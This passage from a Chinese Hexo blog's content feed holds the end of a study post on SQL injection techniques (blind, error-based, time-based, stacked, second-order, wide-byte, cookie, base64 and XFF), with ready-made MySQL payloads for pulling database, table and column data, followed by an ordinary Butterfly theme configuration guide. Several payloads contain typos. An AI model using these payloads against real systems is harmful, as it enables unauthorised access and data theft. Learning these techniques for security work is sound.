class="line">#我们在这里判断第几位，database()后的数字就修改成几</span><br></pre></td></tr></table></figure><p><strong>查询表名</strong></p><p>之前查询库名我们在语句中使用了database(),那么我们查询表明就将相应位置替换为查询表名的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1</span><br></pre></td></tr></table></figure><p>那么完整的语句就应该更改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),1,1)=&#x27;s&#x27;--+</span><br></pre></td></tr></table></figure><p>那么用这种方法我们很快就可以查出所有的表名和字段名。</p><p>这里把相关查询语句总结放在这里（Boolean盲注）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">&#x27; and length(database())=1--+ </span><br><span class="line"></span><br><span class="line">#库名</span><br><span class="line">&#x27; and substr(database(),1,1)=&#x27;库名第一位&#x27;--+                 #第一种</span><br><span class="line"></span><br><span class="line">&#x27; and substr((select schema_name from information_schema.schemata limit 0,1),1,1)=&#x27;库名第一位&#x27;                                 #第二种</span><br><span class="line"></span><br><span class="line">#表名</span><br><span class="line">&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),1,1)=&#x27;表名第一位&#x27;--+</span><br><span class="line"></span><br><span class="line">#字段名</span><br><span class="line">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1),1,1)=&#x27;字段名第一位&#x27;--+                </span><br><span class="line"></span><br><span class="line">#具体值</span><br><span class="line">&#x27; and substr((select username_id from mysql.usernames limit 0,1),1,1)=&#x27;字段名第一位&#x27;--+      </span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="流程-2"><a href="#流程-2" class="headerlink" title="流程"></a>流程</h3><p>如果访问的场景url后缀为?username&#x3D;1之类的，我们在参数后边拼接’，在数据库执行语句时会因为语法错误报错，输出到页面的结果输出报错信息。</p><p>报错注入的格式很多，这里用updatexml()演示</p><p>获取use()<strong>的值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#这里的0x7e是ASCII编码，解码结果为~。所以这里返回包的信息应该是~username~</span><br></pre></td></tr></table></figure><p><strong>获取库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>之后可以使用select语句获取库名，表明字段名，查询语句与union注入的相同，因为报错注入只显示一条结果，所以需要使用limit语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#获取use()值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取库名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+  #方法一</span><br><span class="line"></span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select schema_name from         information_schema.schemata limit 0,1),0x7e),1)--+             #方法二</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取字段名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select username_id from mysql.usernames limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注与布尔盲注很像，首先在url的id&#x3D;1后拼接单引号查看返回包，如果返回的是no，说明只能返回yes或者no，那我们除了布尔盲注外可以通过查看bp里repeater返回包右下角的响应时间来做判断。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240729212148274.png" class="" title="image-20240729212148274"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#1秒=1000毫秒</span><br></pre></td></tr></table></figure><h3 id="流程-3"><a href="#流程-3" class="headerlink" title="流程"></a>流程</h3><p><strong>查询库名长度</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (length(database())&gt;1,sleep(5),1)</span><br><span class="line"></span><br><span class="line">#意思是如果数据库库名长度大于1，吧呢么MySQL查询休眠5秒，否则查询1，之后就可以通过返回包响应时间来做判断</span><br><span class="line"></span><br><span class="line">if (length(database())&gt;10,sleep(5),1)</span><br><span class="line">#如果把数句酷库名长度改为大于10，返回的时间极少，说明语句被成功执行，说明数据库库名长度不大于10</span><br></pre></td></tr></table></figure><p>之后就可以执行库名等的查询了，语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#查询库名（通过查看返回包的响应式时间来判断字母对不对）</span><br><span class="line">if(substr(database()1,1)=&#x27;s&#x27;,sleep(5),1)           #方法一</span><br><span class="line">if(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=&#x27;s&#x27;,sleep(5),1)                         #方法二</span><br><span class="line"></span><br><span class="line">#查询表名</span><br><span class="line">if(substr((select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),1,1))=&#x27;s&#x27;,sleep(5),1) </span><br><span class="line"></span><br><span class="line">#查询字段名</span><br><span class="line">if(substr((select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1),1,1)=&#x27;s&#x27;,sleep(5),1)</span><br><span class="line"></span><br><span class="line">#查询值</span><br><span class="line">if(substr((select username_id from mysql.usernames limit 0,1),1,1)=&#x27;s&#x27;,sleep(5),1) </span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>堆叠查询可以执行多条语句，多语句之间用分号隔开，堆叠注入就是使用这个特点，在第二个SQL语句中构造自己要执行的语句。</p><h3 id="流程-4"><a href="#流程-4" class="headerlink" title="流程"></a>流程</h3><p>首先访问id&#x3D;1’,页面返回mysql错误，再访问id&#x3D;1’%23,页面返回正常结果，这里就可以使用布尔盲注，时间注入和堆叠注入。</p><p><strong>获取user()值语句</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;select if(substr(user()1,1)=&#x27;s&#x27;,sleep(3),1)%23</span><br><span class="line"></span><br><span class="line">#所以堆叠注入就是&#x27;; select后加时间注入的语句</span><br></pre></td></tr></table></figure><p>那么相应的构造语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">&#x27;; select if (length(database())&gt;1,sleep(3),1)%23</span><br><span class="line"></span><br><span class="line">#获取库名</span><br><span class="line">&#x27;; select if(substr(database()1,1)=&#x27;s&#x27;,sleep(3),1)%23          #方法一</span><br><span class="line"></span><br><span class="line">&#x27;; selectif(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=&#x27;s&#x27;,sleep(3),1)%23#方法二</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">&#x27;; select if(substr((select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),1,1))=&#x27;s&#x27;,sleep(3),1)%23</span><br><span class="line"></span><br><span class="line">#获取字段名</span><br><span class="line">&#x27;; select if(substr((select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1),1,1)=&#x27;s&#x27;,sleep(5),1)%23</span><br><span class="line"></span><br><span class="line">#获取值</span><br><span class="line">&#x27;; select if(substr((select username_id from mysql.usernames limit 0,1),1,1)=&#x27;s&#x27;,sleep(5),1)%23</span><br></pre></td></tr></table></figure><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>二次注入场景假设：两个页面，页面一（1.php）功能是注册用户名，也是插入SQL语句的地方，页面二（2.php）功能是通过参数ID读取用户名和用户信息。</p><h3 id="流程-5"><a href="#流程-5" class="headerlink" title="流程"></a>流程</h3><p>访问1.php?username&#x3D;test’,结果返回一个id号为21，这说明用户名test‘对应的id为21，那么我们去另一个页面访问2.php?id&#x3D;21,如果返回了Mysql的错误，说明这里大概率存在SQL注入。</p><p>我们回到第一个页面访问1.php?username&#x3D;test’ order by 1%23，拿到新的id&#x3D;32，之后带着新的id&#x3D;32去访问页面2.php?id&#x3D;32，返回空白页面。</p><p>这时我们再拿一个新的id，访问1.php?username&#x3D;test’ order by 10%23，拿到一个新的id&#x3D;33，之后拿着id&#x3D;33去访问页面2.php?id&#x3D;33，如果返回Mysql报错（Unknown column ‘10’ in ‘order clause’）,说明之前的空白页面是正常返回，之后重复order by来判断字段数量。</p><p>假设这里有三个字段，我们通过访问2.php?username&#x3D;test’ union select 1,2,3%23,获取到新的id&#x3D;39，之后访问2.php?id&#x3D;39,发现返回union select中的2和3字段。</p><p>那么之后我们就可以在2和3的位置插入查询语句，比如访问1.php?id&#x3D;test’ union select 1,user(),3%23，获取新的id&#x3D;40，得到user()的结果。</p><p>查询语句与联合注入相同，只是查看返回结果时，要拿1.php页面的id号去2.php查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">id=1 order by 4</span><br><span class="line"></span><br><span class="line">#确定位置,后续语句将1，2，3中某个可用数字更改为(该语句)</span><br><span class="line">id=-1&#x27; union select 1,2,3</span><br><span class="line"></span><br><span class="line">#库名</span><br><span class="line">select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br><span class="line"></span><br><span class="line">#表名</span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">#字段名</span><br><span class="line">select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1            </span><br><span class="line"></span><br><span class="line">#具体值</span><br><span class="line">select username_id from mysql.usernames limit 0,1</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>当出现以下场景：</p><p>当访问id&#x3D;1’返回的结果没有报错，而是返回了查询语句并将’前加入了一个转义符\，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where id=&#x27;1\&#x27;&#x27; limit 0,1</span><br></pre></td></tr></table></figure><p>此处说明参数id&#x3D;1在数据库查询时是被单引号包围的，当传入id&#x3D;1’时，传入的单引号被\转义，导致参数ID无法逃逸单引号的包围，所以一般情况下，此处是不存在SQL注入漏洞的，但是有一个特例，当数据库编码为GBK时，可以使用宽字节注入。</p><p>宽字节注入格式是在地址后加一个%df，再加单引号，因为反斜杠的编码是%5c,而在GBK编码中，%df%5c是繁体字’縗’,所以这时，单引号成功逃逸，爆出mysql数据库错误。</p><p>由于输入的参数id&#x3D;1’，导致SQL语句多了一个单引号，所以需要使用注释符来注释自身的单引号，访问id&#x3D;1%df%23,，此时\和%df一起被转义了，所以单引号成功逃逸，SQL语句就符合语法规范。</p><p>之后就可以结合union注入的语句进行查询了，但是格式需要作出一定的改变</p><h3 id="流程-6"><a href="#流程-6" class="headerlink" title="流程"></a>流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#判断注入</span><br><span class="line">id=1%df&#x27; and 1=1%23      #为真时返回结果，返回查询语句</span><br><span class="line">id=1%df&#x27; and 1=2%23      #为假时不返回结果，只返回查询语句</span><br><span class="line"></span><br><span class="line">#查询字段数量</span><br><span class="line">id=1%df&#x27; order by 3%23</span><br><span class="line"></span><br><span class="line">#确定返回位置</span><br><span class="line">id=1%df&#x27; union select 1,2,3%23</span><br><span class="line"></span><br><span class="line">#获取库名,后续语句则是将user(),修改为(该语句)</span><br><span class="line">id=-1%df&#x27; union select 1,user(),3,%23</span><br><span class="line"></span><br><span class="line">#获取表名,单引号被转义，所以这里嵌套查询</span><br><span class="line">select table_name from information_schema.tables where tables_schema=(select database()) limit 0,1%23</span><br><span class="line"></span><br><span class="line">#获取字段名，这里使用了三层嵌套，第一层是table_schema，他代表苦命的嵌套，第二层和第三层是table_name的嵌套，我们可以看到语句中有两个limit，前一个limit控制表名的顺序，后一个limit控制字段名的顺序</span><br><span class="line">select column_name from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 0,1)limit 0,1</span><br></pre></td></tr></table></figure><h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><p>总体流程和union注入一样，不一样的点在于，不是在url处返回id&#x3D;1，而是在cookie处返回url等于1。</p><h2 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h2><p>总体流程和union注入一样，不一样的点在于，ID参数被base64位编码了，我们的查询语句要经过base64位编码。(%3d是url编码)</p><h3 id="流程-7"><a href="#流程-7" class="headerlink" title="流程"></a>流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">id=MSBvcmRlciBieSA0</span><br><span class="line"></span><br><span class="line">#确定位置,后续语句将1，2，3中某个可用数字更改为(该语句)</span><br><span class="line">id=LTEnIHVuaW9uIHNlbGVjdCAxLDIsMw==      </span><br><span class="line"></span><br><span class="line">#库名</span><br><span class="line">c2VsZWN0IFNDSEVNQV9OQU1FIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLlNDSEVNQVRBIGxpbWl0IDAsMQ==</span><br><span class="line"></span><br><span class="line">#表名</span><br><span class="line">c2VsZWN0IHRhYmxlX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nbXlzcWwnIGxpbWl0IDAsMQ==</span><br><span class="line"></span><br><span class="line">#字段名</span><br><span class="line">c2VsZWN0IGNvbHVtbl9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hPSdteXNxbCcgYW5kIHRhYmxlX25hbWU9J3VzZXJuYW1lcycgbGltaXQgMCwxICAgIA==        </span><br><span class="line"></span><br><span class="line">#具体值</span><br><span class="line">c2VsZWN0IHVzZXJuYW1lX2lkIGZyb20gbXlzcWwudXNlcm5hbWVzIGxpbWl0IDAsMQ==</span><br></pre></td></tr></table></figure><h2 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h2><p>如果http请求头有一个头部参数为X-Forwarded-for(简称XFF头)，他代表了客户端真实ip，通过修改XFF值可以伪造客户端ip，如果将XFF设置为127.0.0.1，然后访问该url页面返回正常。</p><p>之后尝试将127.0.0.1加上’,即127.0.0.1’再次访问，页面返回报错信息，之后通过and 1&#x3D;1#和and 1&#x3D;2#再次访问判断是否存在SQL注入，之后使用union注入的方法完成注入。</p>]]></content>
      
      
      <categories>
          
          <category> top10漏洞 </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Butterfly主题美化</title>
      <link href="/2024/07/17/Butterfly%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/"/>
      <url>/2024/07/17/Butterfly%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="一、butterfly主题下载与主题更换"><a href="#一、butterfly主题下载与主题更换" class="headerlink" title="一、butterfly主题下载与主题更换"></a>一、butterfly主题下载与主题更换</h2><h3 id="在hexo根目录下输入以下命令进行下载"><a href="#在hexo根目录下输入以下命令进行下载" class="headerlink" title="在hexo根目录下输入以下命令进行下载"></a>在hexo根目录下输入以下命令进行下载</h3><p>git下载方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>npm下载方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-theme-butterfly</span><br></pre></td></tr></table></figure><h3 id="修改根目录-config-yml主题"><a href="#修改根目录-config-yml主题" class="headerlink" title="修改根目录_config.yml主题"></a>修改根目录_config.yml主题</h3><p>查找theme关键字，将默认主题修改为butterfly</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><h3 id="主题配置文件"><a href="#主题配置文件" class="headerlink" title="主题配置文件"></a>主题配置文件</h3><p>新建主题盘配置文件**_config.butterfly.yml<strong>，并将theme文件夹下主题配置文件</strong>_config..yml<strong>内容复制粘贴在</strong>_config.butterfly.yml**中。</p><h2 id="二、修改网站主页信息"><a href="#二、修改网站主页信息" class="headerlink" title="二、修改网站主页信息"></a>二、修改网站主页信息</h2><h3 id="导航栏"><a href="#导航栏" class="headerlink" title="导航栏"></a>导航栏</h3><p>将先要添加的目录注释解除掉，并输入以下命令新建相关目录文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">\# Menu 目錄</span><br><span class="line"></span><br><span class="line">menu:</span><br><span class="line"></span><br><span class="line"> 首页: / || fas fa-home</span><br><span class="line"></span><br><span class="line"> 归档: /archives/ || fas fa-archive</span><br><span class="line"></span><br><span class="line"> 标签: /tags/ || fas fa-tags</span><br><span class="line"></span><br><span class="line"> 分类: /categories/ || fas fa-folder-open</span><br><span class="line"></span><br><span class="line"> \# 清单||fas fa-list:</span><br><span class="line"></span><br><span class="line">  \# 音乐: /music/ || fas fa-music</span><br><span class="line"></span><br><span class="line"> \#  电影: /movies/ || fas fa-video</span><br><span class="line"></span><br><span class="line"> 友链: /link/ || fas fa-link</span><br><span class="line"></span><br><span class="line"> 关于: /about/ || fas fa-heart</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page xxx</span><br></pre></td></tr></table></figure><h3 id="社交图标"><a href="#社交图标" class="headerlink" title="社交图标"></a>社交图标</h3><p>取消注释并修改相关链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">social:</span><br><span class="line">  fab fa-github: https://github.com/xxxxx || Github || &quot;#hdhfbb&quot;</span><br><span class="line">  fas fa-envelope: mailto:xxxxxx@gmail.com || Email || &quot;#000000&quot;</span><br></pre></td></tr></table></figure><h3 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h3><p>在站点根目录&#x2F;source下新建img文件夹，将要使用的图片放入，之后修改下列配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">avatar:</span><br><span class="line">  img: /img/avatar.png</span><br><span class="line">  effect: false # 头像一直转圈</span><br></pre></td></tr></table></figure><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><h4 id="代码复制"><a href="#代码复制" class="headerlink" title="代码复制"></a>代码复制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_copy: true</span><br></pre></td></tr></table></figure><h4 id="代码高度限制"><a href="#代码高度限制" class="headerlink" title="代码高度限制"></a>代码高度限制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_height_limit: false # unit: px（修改时写入数字）    </span><br></pre></td></tr></table></figure><h3 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h3><h4 id="文章封面"><a href="#文章封面" class="headerlink" title="文章封面"></a>文章封面</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#显示文章相关信息 </span><br><span class="line">post_meta:</span><br><span class="line">  page:</span><br><span class="line">    date_type: both # created or updated or both 主頁文章日期是創建日或者更新日或都顯示</span><br><span class="line">    date_format: relative # date/relative 顯示日期還是相對日期</span><br><span class="line">    categories: true # true or false 主頁是否顯示分類</span><br><span class="line">    tags: true # true or false 主頁是否顯示標籤</span><br><span class="line">    label: true # true or false 顯示描述性文字</span><br><span class="line">  post:</span><br><span class="line">    date_type: both # created or updated or both 文章頁日期是創建日或者更新日或都顯示</span><br><span class="line">    date_format: relative # date/relative 顯示日期還是相對日期</span><br><span class="line">    categories: true # true or false 文章頁是否顯示分類</span><br><span class="line">    tags: true # true or false 文章頁是否顯示標籤</span><br><span class="line">    label: true # true or false 顯示描述性文字</span><br></pre></td></tr></table></figure><h4 id="版权信息"><a href="#版权信息" class="headerlink" title="版权信息"></a>版权信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># copy settings</span><br><span class="line"># copyright: Add the copyright information after copied content (复制文章后加入版权信息)</span><br><span class="line">copy:</span><br><span class="line">  enable: true</span><br><span class="line">  copyright:</span><br><span class="line">    enable: true</span><br><span class="line">    limit_count: 50</span><br></pre></td></tr></table></figure><h4 id="文章过期提醒"><a href="#文章过期提醒" class="headerlink" title="文章过期提醒"></a>文章过期提醒</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Displays outdated notice for a post (文章過期提醒) #</span><br><span class="line"></span><br><span class="line">noticeOutdate:</span><br><span class="line">  enable: true</span><br><span class="line">  style: flat # style: simple/flat</span><br><span class="line">  limit_day: 365 # When will it be shown</span><br><span class="line">  position: top # position: top/bottom</span><br><span class="line">  message_prev: It has been</span><br><span class="line">  message_next: days since the last update, the content of the article may be outdated.</span><br></pre></td></tr></table></figure><h4 id="文章分页"><a href="#文章分页" class="headerlink" title="文章分页"></a>文章分页</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># post_pagination (分頁)</span><br><span class="line"># value: 1 || 2 || false</span><br><span class="line"># 1: The &#x27;next post&#x27; will link to old post</span><br><span class="line"># 2: The &#x27;next post&#x27; will link to new post</span><br><span class="line"># false: disable pagination</span><br><span class="line">post_pagination: false</span><br></pre></td></tr></table></figure><h3 id="页面美化"><a href="#页面美化" class="headerlink" title="页面美化"></a>页面美化</h3><h4 id="页脚自定义文本"><a href="#页脚自定义文本" class="headerlink" title="页脚自定义文本"></a>页脚自定义文本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">custom_text: Hi, welcome to my &lt;a href=&quot;https://butterfly.js.org/&quot;&gt;blog&lt;/a&gt;!</span><br></pre></td></tr></table></figure><h4 id="公告栏"><a href="#公告栏" class="headerlink" title="公告栏"></a>公告栏</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">card_announcement:</span><br><span class="line"> enable: true</span><br><span class="line"> content: 欢迎来到ourobrosの博客</span><br></pre></td></tr></table></figure><h4 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">comments:</span><br><span class="line"></span><br><span class="line">  # Up to two comments system, the first will be shown as default</span><br><span class="line"></span><br><span class="line">  # Choose: Disqus/Disqusjs/Livere/Gitalk/Valine/Waline/Utterances/Facebook Comments/Twikoo/Giscus/Remark42/Artalk</span><br><span class="line"></span><br><span class="line">  use: # Valine,Disqus</span><br><span class="line">  text: true # Display the comment name next to the button</span><br><span class="line"></span><br><span class="line">  # lazyload: The comment system will be load when comment element enters the browser&#x27;s viewport.</span><br><span class="line"></span><br><span class="line">  # If you set it to true, the comment count will be invalid</span><br><span class="line"></span><br><span class="line">  lazyload: true</span><br><span class="line">  count: true # Display comment count in post&#x27;s top_img</span><br><span class="line">  card_post_count: false # Display comment count in Home Page</span><br></pre></td></tr></table></figure><h4 id="页面美化-1"><a href="#页面美化-1" class="headerlink" title="页面美化"></a>页面美化</h4><figure class="highlight 